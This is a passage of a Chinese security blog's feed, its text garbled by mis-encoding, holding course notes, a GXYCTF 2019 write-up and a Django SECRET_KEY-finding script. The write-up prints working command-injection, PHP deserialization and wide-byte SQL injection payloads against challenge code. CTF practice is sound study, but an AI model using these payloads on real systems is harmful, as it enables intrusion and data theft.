hand.<br>ç”¨å…·ä½“çš„ä¾‹å­æ¥æ£€éªŒæŠ½è±¡çš„æ­¥éª¤æ˜¯å¦èƒ½è§£å†³é—®é¢˜</li><li>Translate to code. </li><li>Run test cases. </li><li>Debug failed test cases.<br>ä¸€èˆ¬å¯ä»¥æŠŠé—®é¢˜åˆ†ä¸º:æ­¥éª¤é—®é¢˜(å¦‚æ²¡è€ƒè™‘æŸäº›ç‰¹æ®Šæƒ…å†µ)å’Œå°†æ­¥éª¤è½¬ä¸ºç¨‹åºæ—¶(å¦‚å‡½æ•°ç”¨é”™)çš„é—®é¢˜</li></ol><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="æ‰‹å†Œ"><a href="#æ‰‹å†Œ" class="headerlink" title="æ‰‹å†Œ"></a>æ‰‹å†Œ</h3><p> <a href="https://developer.mozilla.org/" target="_blank" rel="noopener">https://developer.mozilla.org/</a> </p><p> <a href="https://www.w3schools.com/" target="_blank" rel="noopener">https://www.w3schools.com/</a> </p><h3 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h3><pre><code class="javascript">var img = new SimpleImage(200, 200);for(var pixel of img.values()){//pixelæ˜¯img.values()çš„å¼•ç”¨    pixel.setRed(255);    pixel.setGreen(255);    pixel.setBlue(0);}print(img);</code></pre><h3 id="canvasæ“ä½œ"><a href="#canvasæ“ä½œ" class="headerlink" title="canvasæ“ä½œ"></a>canvasæ“ä½œ</h3><pre><code class="javascript">var canvas=document.getElementById(&quot;show2&quot;);var context = canvas.getContext(&#39;2d&#39;);#initcontext.clearRect(0, 0, canvas.width, canvas.height);#clear canvascontext.font = &quot;30px Arial&quot;;context.fillText(&quot;Hello World&quot;, 10, 50);#draw a textcontext.fillStyle = &quot;red&quot;;context.fillRect(10, 10, 150, 80);#draw rectangle</code></pre><h3 id="å˜é‡èµ‹å€¼"><a href="#å˜é‡èµ‹å€¼" class="headerlink" title="å˜é‡èµ‹å€¼"></a>å˜é‡èµ‹å€¼</h3><p>å½“å˜é‡æ˜¯æ•°å­—å’Œå­—ç¬¦ä¸²çš„æ—¶å€™,ä¼šç”Ÿæˆä¸€ä¸ªæ‹·è´,å†èµ‹å€¼ç»™ç›®æ ‡</p><p>ä½†å¦‚æœå¯¹è±¡æ˜¯æ•°ç»„å’Œå¯¹è±¡æ—¶,è¿™ä¼šå°†å¼•ç”¨èµ‹å€¼ç»™ç›®æ ‡,æ­¤æ—¶ä¿®æ”¹æ–°å˜é‡ä¹Ÿä¼šå½±å“åˆ°æ—§å˜é‡</p><h2 id="htmlæ ‡ç­¾"><a href="#htmlæ ‡ç­¾" class="headerlink" title="htmlæ ‡ç­¾"></a>htmlæ ‡ç­¾</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p><h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h3><p>onclick,onchage,oninput</p><h2 id="ç»™è‡ªå·±çš„å»ºè®®"><a href="#ç»™è‡ªå·±çš„å»ºè®®" class="headerlink" title="ç»™è‡ªå·±çš„å»ºè®®"></a>ç»™è‡ªå·±çš„å»ºè®®</h2><blockquote><p>åˆæ ¼çš„ç¨‹åºå‘˜ä¸åº”è¯¥æµªè´¹å¾ˆå¤šæ—¶é—´ç”¨äºç¨‹åºè°ƒè¯•,ä»–ä»¬åº”è¯¥ä¸€å¼€å§‹å°±ä¸è¦æŠŠæ•…éšœå¼•å…¥.</p><p>â€”-è¿ªæ°æ–¯ç‰¹æ‹‰</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p><p>å‘ç°bug-&gt;æ˜ç¡®ç›®çš„(äº†è§£bugå‘ç”Ÿçš„åŸå› åŠè§£å†³æ–¹æ³•)-&gt;æ”¶é›†ä¿¡æ¯-&gt;(å¤šæ¬¡)æå‡ºçŒœæƒ³(where,why)(è¦å…·æœ‰å¯æµ‹è¯•æ€§)-&gt;éªŒè¯-&gt;è§£å†³</p><h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a href="https://codepen.io/explorersss/full/wvBOwmR" target="_blank" rel="noopener">https://codepen.io/explorersss/full/wvBOwmR</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/01/25/coursera-æœå…‹å¤§å­¦">https://explorersss.github.io/2020/01/25/coursera-æœå…‹å¤§å­¦</a> ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨/](<a href="https://explorersss.github.io/2020/01/25/coursera-æœå…‹å¤§å­¦">https://explorersss.github.io/2020/01/25/coursera-æœå…‹å¤§å­¦</a> ç¨‹åºè®¾è®¡ä¸ Web å…¥é—¨/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gxytf2019</title>
      <link href="/2019/12/22/gxyctf2019/"/>
      <url>/2019/12/22/gxyctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>è¿‡æ»¤$,â€™ â€˜,</p><p>æœªè¿‡æ»¤ç¬¦å·:<code>!,#,$,%,(,.,+,-,:,;,=</code></p><p>è¿‡æ»¤ç©ºæ ¼ç”¨$IFSæ¥ä»£æ›¿</p><p>è¿‡æ»¤flag</p><p>ç”¨base64æ¥ç»•è¿‡</p><p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p><pre><code class="php">    &lt;?php    if(isset($_GET[&#39;ip&#39;])){        $ip = $_GET[&#39;ip&#39;];        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);            die(&quot;fxck your symbol!&quot;);        }        else if(preg_match(&quot;/ /&quot;, $ip)){            die(&quot;fxck your space!&quot;);        }        else if(preg_match(&quot;/bash/&quot;, $ip)){            die(&quot;fxck your bash!&quot;);        }        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){            die(&quot;fxck your flag!&quot;);        }        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);        echo &quot;&lt;pre&gt;&quot;;        print_r($a);    }    ?&gt;</code></pre><p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>æ²¡åšå‡ºæ¥å¿½ç•¥ä»–</strong></p><p>ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†æŠŠ:æ£€æµ‹åç¼€è¿˜æ˜¯ä¸Šä¼ ç±»å‹?</p><p>Content-Type: image/jpeg,å¯ä»¥ä¸Šä¼ äº†</p><p>ä¸Šä¼ æ–‡ä»¶åæ— æ³•è®¿é—®404</p><p>ä¸Šä¼ æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹å’Œsessionæœ‰å…³</p><p>å°†sessionç½®ç©ºåæŠ¥é”™</p><pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;</code></pre><p>çŒœæµ‹éšæœºç”Ÿæˆä¸€ä¸ªå€¼æ”¾åˆ°sessioné‡Œé¢</p><p>phpç‰ˆæœ¬5.6å¯ä»¥%00æˆªæ–­</p><p>åç¼€ä¸èƒ½ä»¥phç»“å°¾</p><h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote><p>PHP åœ¨ååºåˆ—åŒ– string æ—¶æ²¡æœ‰ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–æ ¼å¼ <code>s:x:&quot;x&quot;;</code>è¿›è¡Œå¤„ç†ï¼Œæ²¡æœ‰å¯¹ <code>&quot;</code>åé¢çš„æ˜¯å¦å­˜åœ¨ <code>;</code> è¿›è¡Œåˆ¤æ–­ï¼ŒåŒæ—¶å¢åŠ äº†å¯¹åå…­è¿›åˆ¶å½¢å¼å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œè¿™æ ·å‰åå¤„ç†çš„ä¸ä¸€è‡´è®©äººå¾ˆè´¹è§£ï¼ŒåŒæ—¶ç”±äº PHP æ‰‹å†Œä¸­å¯¹æ­¤æ²¡æœ‰è¯¦ç»†çš„è¯´æ˜ï¼Œå¤§éƒ¨åˆ†ç¨‹åºå‘˜å¯¹æ­¤å¤„ç†è¿‡ç¨‹å¹¶ä¸äº†è§£ï¼Œè¿™å¯èƒ½å¯¼è‡´å…¶åœ¨ç¼–ç è¿‡ç¨‹ä¸­å‡ºç°ç–æ¼ï¼Œç”šè‡³å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚</p></blockquote><pre><code class="php">&lt;?php class FileReader{    public $Filename;    public $start;    public $max_length;    function __construct(){        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;        $this-&gt;start = 12;        $this-&gt;max_length = 72;    }    function __wakeup(){        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;        $this-&gt;start = 10;        $this-&gt;max_length = 0;        echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;    }    function __destruct(){        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length);        if(preg_match(&quot;/\{|\}/&quot;, $data)){            die(&quot;you can&#39;t read flag!&quot;);        }        else{            echo $data;        }    }}if(isset($_GET[&#39;exp&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;exp&#39;])){        die(&quot;hack!&quot;);    }    $exp = $_REQUEST[&#39;exp&#39;];    $e = unserialize($exp);    echo $e-&gt;Filename;}else{    $exp = new FileReader();}?&gt;</code></pre><p>ä»¤å±æ€§æ•°é‡ä¸å®é™…æ•°é‡ä¸åŒæ¥ç»•è¿‡<code>__wakeup</code></p><p>åˆ©ç”¨16è¿›åˆ¶ç»•è¿‡flagçš„é™åˆ¶</p><p><code>O:10:&quot;FileReader&quot;:4:{s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;}</code></p><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>æ­£åˆ™åŒ¹é…çš„å››<code>$_GET</code>,è€Œä¼ çš„å‚æ•°æ˜¯<code>$_REQUEST</code>,ä»è€Œç»•è¿‡</p><h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select è®¾ç½®è‡ªå·±çš„å¯†ç æ‹¿åˆ°flag</p><h2 id="ç¦æ­¢å¥—å¨ƒ"><a href="#ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="ç¦æ­¢å¥—å¨ƒ"></a>ç¦æ­¢å¥—å¨ƒ</h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>å’Œbytectf2019æœ‰ç‚¹ç±»ä¼¼ <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p><p><code>var_dump(scandir(chr(time())));</code></p><p><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; }</code></p><p>chr,random_bytes</p><p>ç¿»æ•°ç»„ç›¸å…³çš„å‡½æ•°æ‰¾åˆ°array_rand,ä½†æ˜¯é—æ†¾çš„æ˜¯è¿”å›çš„æ˜¯é”®å,å¦‚æœæˆ‘ä»¬èƒ½äº¤æ¢é”®åå’Œå€¼å°±å¯ä»¥æ‹¿åˆ°flag.phpäº†,å†æ‰¾ä¸€æ‰¾å‘ç°array_filp</p><p>æœ€åçš„payload</p><p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p><h3 id="è§£æ³•äºŒ-1"><a href="#è§£æ³•äºŒ-1" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p><code>readfile(session_id(session_start()))</code></p><p>ç„¶å<code>PHPSESSID=flag.php</code>è¯»åˆ°flag</p><h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>æåˆ°ä¸­æ–‡,å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡å¼•å·</p><p>è¿‡æ»¤select,union,whereç­‰</p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p><p>å›æ˜¾å¯†ç </p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p><p>æ•°æ®åº“:<code>information_schema,web_sqli</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p><p>è¡¨:<code>f14g,user</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p><p>åˆ—:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p><p>è¯»å–flag,ä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶</p><p>æœ€åå¾—åˆ°æŠ–è‚©èˆ+flag</p><p>GXY{g0Od_job1im_so_vegetable}</p><h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>å¯¹phpsessionæ³¨å…¥æŠ¥é”™</p><pre><code class="html">&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=uft-8&quot;/&gt;&lt;title&gt;login&lt;/title&gt;&lt;script&gt;alert(&#39;Wrong pass&#39;);location.href=&#39;./index.php&#39;&lt;/script&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;</code></pre><pre><code>[21:19:28] 200 -   89B  - /home.php[21:19:29] 200 -  562B  - /index.php[21:19:35] 200 -  253B  - /upload.php[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/[21:19:35] 403 -  300B  - /uploads/</code></pre><p>fuzzä¸€ä¸‹å‘ç°æ²¡å•¥å¥½æ³¨çš„</p><p>å†ç»“åˆæ‰«åˆ°çš„ä¸œä¸œ,çˆ†ç ´å¾—åˆ°å¯†ç password</p><p>æ–‡ä»¶ä¸Šä¼ æ²¡ç”¨?ä¸Šä¼ åæ²¡æœ‰ä»»ä½•æç¤º</p><p>content-typeæ”¹ä¸ºjpeg,å¯ä»¥ä¸Šä¼ ä½†æ˜¯åç¼€æ˜¯.txt</p><p>å¦‚æœèƒ½æ§åˆ¶åç¼€å°±å¯ä»¥æ–‡ä»¶åŒ…å«äº†å°è¯•æ–‡ä»¶åå¤„%00æˆªæ–­æ— æ•ˆ</p><p>homeå¤„æœ‰æ–‡ä»¶åŒ…å«,ä½†æ˜¯ä¼šå†æœ«å°¾æ·»åŠ .fxxkyou(home.phpå’Œupload.phpä¸ä¼š)</p><p>å› ä¸ºé¢˜ç›®ç¯å¢ƒæ˜¯5.6,å°è¯•%00æˆªæ–­ [ x ]</p><p>è¿™é‡Œæˆ‘å‘ç°æˆ‘å¯¹æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶åŒ…å«éƒ¨åˆ†çš„æŒæ¡ä¸å¥½,ä»¥åŠæ€è€ƒè§£å†³æ–¹æ³•æ—¶å€™çš„æ€è€ƒæ–¹å¼ä¸å¤ªè¡Œ</p><p>è¿™é‡Œåˆ©ç”¨ä¼ªåè®®ç›´æ¥è¯»å–ä»£ç ,ä½†æ˜¯æˆ‘å´ååæ²¡æƒ³åˆ°è¿™ä¹ˆåŸºç¡€çš„ä¸œè¥¿.å›å»é‡æ–°å­¦ä¹ ä¸€ä¸‹æ–‡ä»¶åŒ…å«å’Œä¸Šä¼ </p><p>ä»£ç å®¡è®¡å‘ç°pharååºåˆ—åŒ–å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>å·²è¢«é­”æ”¹</p><p>home.php</p><pre><code class="php">&lt;?phpecho &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_GET[&#39;file&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;hacker!&quot;);    }    else{        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#39;file&#39;])){            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;        }        else{            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        }        echo &quot;å½“å‰å¼•ç”¨ &quot;.$file;        require $file;    }}else{    die(&quot;no permission!&quot;);}?&gt;</code></pre><p>upload.php</p><pre><code class="php">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    ä¸Šä¼     &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;&lt;/form&gt;&lt;?phpclass Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd().&quot;/uploads/&quot;.md5(&quot;admin&quot;).&quot;/&quot;;        $ext = &quot;.txt&quot;;        @mkdir($sandbox, 0777, true);        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){            $this-&gt;Filename = $_GET[&#39;name&#39;];        }        else{            $this-&gt;Filename = $sandbox.&quot;admin&quot;.$ext;        }        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;        $this-&gt;token = &quot;admin&quot;;    }    function upload($file){        global $sandbox;        global $ext;        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;        }        else{            if($file[&#39;size&#39;] &gt; 1024){                $this-&gt;cmd = &quot;die(&#39;you are too big ( :) )&#39;);&quot;;            }            else{                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;            }        }    }    function __toString(){        global $sandbox;        global $ext;        // return $sandbox.$this-&gt;Filename.$ext;        return $this-&gt;Filename;    }    function __destruct(){        if($this-&gt;token != &quot;admin&quot;){            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;        }        eval($this-&gt;cmd);        echo &quot;__destruct&quot;;    }}if(isset($_FILES[&#39;file&#39;])) {    $uploader = new Uploader();    $uploader-&gt;upload($_FILES[&quot;file&quot;]);    if(@file_get_contents($uploader)){        echo &quot;æˆåŠŸä¸Šä¼ &lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;        echo file_get_contents($uploader);    }}?&gt;</code></pre><h2 id="å‚è€ƒ-å…¶ä»–äººçš„wp"><a href="#å‚è€ƒ-å…¶ä»–äººçš„wp" class="headerlink" title="å‚è€ƒ(å…¶ä»–äººçš„wp)"></a>å‚è€ƒ(å…¶ä»–äººçš„wp)</h2><ol><li><a href="http://www.qfrost.com/PWN/GXY_CTF/" target="_blank" rel="noopener">http://www.qfrost.com/PWN/GXY_CTF/</a> </li></ol><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/22/gxyctf2019/">https://explorersss.github.io/2019/12/22/gxyctf2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> çº¿ä¸Šèµ› </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®</title>
      <link href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®"><a href="#djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®" class="headerlink" title="djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®"></a>djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®</h1><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p>åœ¨çœ‹pç‰›çš„picklecode wpçš„æ—¶å€™å¡åœ¨secret_keyæŸ¥æ‰¾é‚£è¾¹</p><p>çœ‹åˆ°pç‰›ä¸€å¥å¾ˆå®¹æ˜“,äººå°±å‚»æ‰äº†</p><p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p><p>èŠ±äº†ä¸€å¤©æ—¶é—´(è¸©äº†ä¸ªå‘),å†™äº†ä¸ªå¿«é€ŸæŸ¥æ‰¾secret_keyçš„è„šæœ¬</p><p>ä»£ç å†™çš„ä¸å¤ªå¥½,è‡ªå·±æ”¹æ”¹ç”¨å§////</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>è¿™ä¸ªæ˜¯æŠŠæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„éƒ½è¾“å‡º,ä½ å¯ä»¥é€šè¿‡ä¿®æ”¹é€’å½’æ·±åº¦å’Œè¿”å›æ¡ä»¶æ¥åŠ å¿«,ä¸ç„¶è¦ç­‰ä¸ªå‡ åˆ†é’Ÿ</p><h2 id="é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘"><a href="#é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘" class="headerlink" title="é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘"></a>é¡ºä¾¿è¯´ä¸‹è¸©åˆ°çš„å‘</h2><p>å› ä¸ºä¸çŸ¥é“dir()å’Œ<code>__dict__</code>çš„åŒºåˆ«,ä¸€ç›´ä»¥ä¸º<code>__dict__</code>==dir,ç„¶åå°±boomm</p><p>dir()å’Œ<code>__dict__</code>çš„åŒºåˆ«</p><p>æœ€ç®€å•çš„ä¸€å¥å‘\è¯æ˜¯<code>__dict__</code>æ˜¯dirçš„å­é›†åˆ</p><p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p><p>æ‰€ä»¥ä»¥åæŸ¥çœ‹å¯¹è±¡çš„æ‰€æœ‰å±æ€§ä¸€å®šè¦ç”¨dir()</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/21/djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®/">https://explorersss.github.io/2019/12/21/djangoå¿«é€ŸæŸ¥æ‰¾é…ç½®/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°å·¥å…· </tag>
            
            <tag> ctf </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwtæ”»å‡»æ–¹å¼</title>
      <link href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
